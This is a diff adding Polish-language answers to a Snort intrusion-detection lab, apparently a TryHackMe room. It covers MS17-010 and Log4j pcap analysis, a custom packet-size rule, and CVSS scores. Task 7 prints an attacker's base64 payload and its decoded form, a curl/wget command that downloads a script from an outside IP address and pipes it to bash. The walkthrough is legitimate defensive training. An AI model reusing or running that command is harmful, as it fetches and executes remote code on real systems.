@@ -232,6 +232,47 @@ Uzyłem polecenia ```sudo strings snort.log.1725383302``` - odpowiedzieć może 
 ![image](https://github.com/user-attachments/assets/341ad940-046b-49da-a515-9cc1c1fe472d)
 
 
+Task 4:Jaki jest wynik CVSS v2 dla luki w zabezpieczeniach MS17-010?
+To już możemy sobie znaleźc w internecie:
 
+![image](https://github.com/user-attachments/assets/34f7c1ea-cfeb-49cc-8520-9c6e3a64e5a8)
 
+8.Korzystanie z reguł zewnętrznych (Log4j)
 
+Task 1:Użyj podanego pliku reguł ( local.rules ), aby zbadać wykorzystanie luki log4j.
+Jaka jest liczba wykrytych pakietów?
+
+W tym przypadku użyliśmy tego polecenia: ```sudo snort -c local.rules -r log4j.pcap -l .``` odpowiedźią jest: 26
+
+Task 2:Zbadaj  pliki dziennika/alarmu.
+Ile reguł zostało uruchomionych?
+Tutaj użyliśmy polecenia: ```sudo strings snort.log.1725383650 ``` odpowiedźią jest: 4
+
+Task 3:Jakie są pierwsze sześć cyfr identyfikatorów reguły wyzwalanej?
+
+użylem ponownie polecenia ```sudo strings alert```
+
+![image](https://github.com/user-attachments/assets/a772f764-9a2f-4e87-a77a-4bd07653857c)
+
+Task 4:Użyj pustego pliku local-1.rules ,   aby napisać nową regułę wykrywającą pakiety o rozmiarze od 770 do 855 bajtów .
+
+To bedzie nasz skrypt ```alert tcp any any -> any any (msg:"Packet size between 770 and 855 bytes"; dsize:770<>855; sid:1000002; rev:1;)``` - którym nam może ilośc pakietów 
+
+![image](https://github.com/user-attachments/assets/83ae14d0-4ed8-4a63-8372-dd782b3dbbec)
+
+Task 5: Jak nazywa się zastosowany algorytm kodowania? 
+Odpowiedźią jest: base64
+
+Task 6:Jaki jest  identyfikator IP odpowiadającego mu pakietu? 
+Użyliśmy poniższego polecenia, odpowiedźią jest: 62808
+
+```sudo strings alert | grep -e 45.155.205.233 -e ID```
+
+Task 7:Jakie polecenie wydaje atakujący?
+```KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=``` - oto zakodowane polecenie,
+odkodowane wyglądada następująco: ```(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash``` 
+
+Task 8:Jaki jest wynik CVSS v2 dla podatności Log4j?
+Odpowiedźią jest: 9.3, ponownie możemy to wyszukac w internecie.
+
+Dzięki wielkie to już tyle, mam nadzieje, że Ci się przydał ten pokój.
